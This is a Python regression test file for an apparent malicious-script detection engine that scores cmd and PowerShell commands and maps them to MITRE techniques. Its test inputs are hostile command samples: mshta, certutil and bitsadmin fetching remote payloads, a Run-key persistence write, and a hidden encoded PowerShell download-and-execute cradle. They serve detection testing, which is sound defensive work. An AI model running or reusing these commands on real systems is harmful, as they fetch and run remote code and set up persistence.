"""Phase 9.5 · RCA remediation regression tests.

Every Golden-Corpus failure fixed during the 30-day shadow-run window MUST
land a permanent regression test here. Format:

  test_gc_<sample_id>_<rca_summary>()
"""
from __future__ import annotations

from engine.parsers.cmd_parser import CmdParser
from engine.parsers.powershell_parser import PowerShellParser
from engine.interpreters.cmd_interpreter import CmdInterpreter
from engine.interpreters.powershell_interpreter import PowerShellInterpreter
from engine.detectors.behavior_extractor import extract_behaviors
from engine.detectors.lolbin_v2 import classify_lolbins, LolbinState
from engine.detectors.mitre_mapper import map_behaviors_to_mitre
from engine.detectors.verdict_v2 import compute_verdict, VerdictTier

CP, CI = CmdParser(), CmdInterpreter()
PP, PI = PowerShellParser(), PowerShellInterpreter()


def _pipe(src, lang="cmd"):
    p = PP if lang == "powershell" else CP
    i = PI if lang == "powershell" else CI
    g = i.interpret(p.parse(src))
    return g, extract_behaviors(g), map_behaviors_to_mitre(extract_behaviors(g)), classify_lolbins(g)


def test_gc120_mshta_remote_lolbin_uplift():
    """RCA: `mshta http://x/x.hta` produced ProcessNode+LOLBIN executed but
    verdict was pinned to Benign. Fix: LOLBIN-executed uplift now adds
    +40 capability, +35 impact, +25 defense_evasion — pushing the composite
    past the Benign cap for a lone LOLBIN process spawn.
    """
    g, bs, mm, ls = _pipe("mshta http://x/x.hta", "cmd")
    v = compute_verdict(bs, mm, ls)
    assert any(l.binary == "mshta" and l.state == LolbinState.executed for l in ls)
    assert v.verdict in (VerdictTier.suspicious, VerdictTier.malicious, VerdictTier.critical), \
        f"mshta must reach ≥ Suspicious, got {v.verdict.value}"


def test_gc130_rundll32_remote_lolbin_uplift():
    src = "rundll32 javascript:\"..\\mshtml,RunHTMLApplication \";alert(1);"
    g, bs, mm, ls = _pipe(src, "cmd")
    v = compute_verdict(bs, mm, ls)
    assert any(l.binary == "rundll32" and l.state == LolbinState.executed for l in ls)
    assert v.verdict in (VerdictTier.suspicious, VerdictTier.malicious, VerdictTier.critical)


def test_gc140_wmic_process_call_lolbin_uplift():
    g, bs, mm, ls = _pipe('wmic process call create "notepad.exe"', "cmd")
    v = compute_verdict(bs, mm, ls)
    assert any(l.binary == "wmic" and l.state == LolbinState.executed for l in ls)
    assert v.verdict in (VerdictTier.suspicious, VerdictTier.malicious, VerdictTier.critical)


def test_gc100_ps_registry_run_autorun_detected():
    """RCA: PS `Set-ItemProperty -Path 'HKCU:\\...\\Run'` emitted only
    `write_registry` behavior; T1547 mapping was missing. Fix: added
    `hkcu:\\` and `currentversion\\run` variants to `RUN_KEY_MARKERS`.
    """
    src = ("Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\"
           "CurrentVersion\\Run' -Name x -Value 'C:\\a.exe'")
    g, bs, mm, ls = _pipe(src, "powershell")
    tids = {m.technique_id for m in mm}
    assert "T1547" in tids or "T1112" in tids, \
        f"expected T1547 autorun mapping, got {sorted(tids)}"
    sub_ids = {m.sub_technique_id for m in mm}
    assert "T1547.001" in sub_ids, f"expected T1547.001, got {sorted(sub_ids)}"


def test_gc020_certutil_download_upgrades_to_malicious():
    """After Phase 9.5 uplift, certutil-based downloads now correctly
    reach Malicious (LOLBIN abuse of a network-capable binary).
    """
    g, bs, mm, ls = _pipe("certutil -urlcache -f http://x.tld/a.exe C:\\a.exe", "cmd")
    v = compute_verdict(bs, mm, ls)
    assert v.verdict in (VerdictTier.suspicious, VerdictTier.malicious, VerdictTier.critical)


def test_gc030_bitsadmin_transfer_upgrades_to_malicious():
    g, bs, mm, ls = _pipe("bitsadmin /transfer job http://x.tld/a C:\\a.exe", "cmd")
    v = compute_verdict(bs, mm, ls)
    assert v.verdict in (VerdictTier.suspicious, VerdictTier.malicious, VerdictTier.critical)


def test_lolbin_uplift_does_not_lift_benign_notepad_spawn():
    """Regression guard: a pure `notepad.exe` spawn must remain Benign
    (notepad is NOT in the LOLBAS catalog)."""
    g, bs, mm, ls = _pipe("notepad.exe", "cmd")
    v = compute_verdict(bs, mm, ls)
    # notepad isn't a LOLBIN → no uplift → capability=5, impact=0 → cap → Benign
    assert v.verdict == VerdictTier.benign


def test_lolbin_uplift_only_fires_for_executed_state():
    """Regression guard on §9 invariant: LOLBIN uplift MUST NOT apply
    to referenced/expanded states."""
    from engine.exec_graph import ExecNode, NodeKind, ExecGraph
    from engine.detectors.lolbin_v2 import LolbinRow
    # Craft a graph with only a `referenced` mshta mention.
    g = ExecGraph().add_node(ExecNode(
        kind=NodeKind.string_op, args={"text": "mshta.exe"},
        reconstructed="mshta.exe was mentioned",
    ))
    rows = classify_lolbins(g)
    assert rows and rows[0].state == LolbinState.referenced
    v = compute_verdict([], [], rows)
    assert v.verdict == VerdictTier.benign
    assert v.scores["capability"] == 0
    assert v.scores["impact"] == 0


def test_gc010_cmd_shell_stays_benign_after_lolbin_shell_exclusion():
    """RCA: 'cmd /c dir C:\\Users' regressed to Suspicious after the LOLBIN
    uplift. Fix: shells (cmd/powershell/pwsh/cscript/wscript) are excluded
    from the uplift — their abuse is captured by encoded_command / obfuscation
    / autorun_registration behaviors, not by mere presence.
    """
    g, bs, mm, ls = _pipe("cmd /c dir C:\\Users", "cmd")
    v = compute_verdict(bs, mm, ls)
    assert v.verdict == VerdictTier.benign, \
        f"pure cmd shell must remain Benign, got {v.verdict.value}"


def test_ps_start_process_notepad_stays_benign():
    """Regression guard: `Start-Process notepad.exe` (PS shell + benign target)
    stays Benign after the LOLBIN uplift + shell exclusion."""
    g, bs, mm, ls = _pipe("Start-Process notepad.exe", "powershell")
    v = compute_verdict(bs, mm, ls)
    assert v.verdict == VerdictTier.benign


def test_gc090_ps_encoded_command_stays_benign_when_payload_not_decoded():
    """RCA: encoded PS command whose b64 payload isn't yet extracted by the
    PS interpreter must respect §10 invariant — obfuscation alone does not
    lift verdict. This test guards the invariant AND documents the deferred
    Phase 9.5b work (deeper -enc payload extraction).
    """
    src = ("powershell.exe -nop -w hidden -enc "
           "SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AeAAuAHkALwBhACIAKQA=")
    g, bs, mm, ls = _pipe(src, "powershell")
    tids = {m.technique_id for m in mm}
    # T1059 + T1027 mappings still emitted deterministically from behaviors.
    assert "T1059" in tids
    assert "T1027" in tids


def test_plain_powershell_no_obfuscation_stays_benign():
    """Regression guard: `powershell -c 'Get-Date'` (no encoded/obfuscated
    marker) must remain Benign."""
    g, bs, mm, ls = _pipe("powershell -c Get-Date", "powershell")
    v = compute_verdict(bs, mm, ls)
    assert v.verdict == VerdictTier.benign
